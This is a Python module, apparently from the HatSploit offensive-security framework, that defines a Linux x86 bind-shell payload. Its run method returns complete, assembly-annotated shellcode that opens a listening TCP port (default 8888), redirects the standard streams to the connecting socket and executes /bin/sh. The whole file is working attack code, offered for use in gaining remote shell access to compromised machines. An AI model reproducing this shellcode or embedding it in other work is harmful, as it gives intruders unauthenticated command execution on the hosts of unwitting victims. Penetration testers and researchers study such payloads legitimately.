#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "stager",
        'Name': "Linux x86 Shell Bind TCP",
        'Payload': "linux/x86/shell_bind_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell bind TCP payload for Linux x86.",
        'Comments': [
            ''
        ],
        'Architecture': "x86",
        'Platform': "linux",
        'Rank': "high",
        'Type': "bind_tcp"
    }

    options = {
        'BPORT': {
            'Description': "Bind port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        bind_port = self.parse_options(self.options)

        return (
            b"\x31\xdb"              # xorl    %ebx,%ebx
            b"\xf7\xe3"              # mull    %ebx
            b"\x53"                  # pushl   %ebx
            b"\x43"                  # incl    %ebx
            b"\x53"                  # pushl   %ebx
            b"\x6a\x02"              # pushl   $0x02
            b"\x89\xe1"              # movl    %esp,%ecx
            b"\xb0\x66"              # movb    $0x66,%al
            b"\xcd\x80"              # int     $0x80
            b"\x5b"                  # popl    %ebx
            b"\x5e"                  # popl    %esi
            b"\x52"                  # pushl   %edx
            b"\x68\x02\x00"          # pushl   port
            b":bport:port:"
            b"\x6a\x10"              # pushl   $0x10
            b"\x51"                  # pushl   %ecx
            b"\x50"                  # pushl   %eax
            b"\x89\xe1"              # movl    %esp,%ecx
            b"\x6a\x66"              # pushl   $0x66
            b"\x58"                  # popl    %eax
            b"\xcd\x80"              # int     $0x80
            b"\x89\x41\x04"          # movl    %eax,0x04(%ecx)
            b"\xb3\x04"              # movb    $0x04,%bl
            b"\xb0\x66"              # movb    $0x66,%al
            b"\xcd\x80"              # int     $0x80
            b"\x43"                  # incl    %ebx
            b"\xb0\x66"              # movb    $0x66,%al
            b"\xcd\x80"              # int     $0x80
            b"\x93"                  # xchgl   %eax,%ebx
            b"\x59"                  # popl    %ecx
            b"\x6a\x3f"              # pushl   $0x3f
            b"\x58"                  # popl    %eax
            b"\xcd\x80"              # int     $0x80
            b"\x49"                  # decl    %ecx
            b"\x79\xf8"              # jns     <bndsockcode+50>
            b"\x68\x2f\x2f\x73\x68"  # pushl   $0x68732f2f
            b"\x68\x2f\x62\x69\x6e"  # pushl   $0x6e69622f
            b"\x89\xe3"              # movl    %esp,%ebx
            b"\x50"                  # pushl   %eax
            b"\x53"                  # pushl   %ebx
            b"\x89\xe1"              # movl    %esp,%ecx
            b"\xb0\x0b"              # movb    $0x0b,%al
            b"\xcd\x80"              # int     $0x80
        ), {
            'bport': bind_port
        }
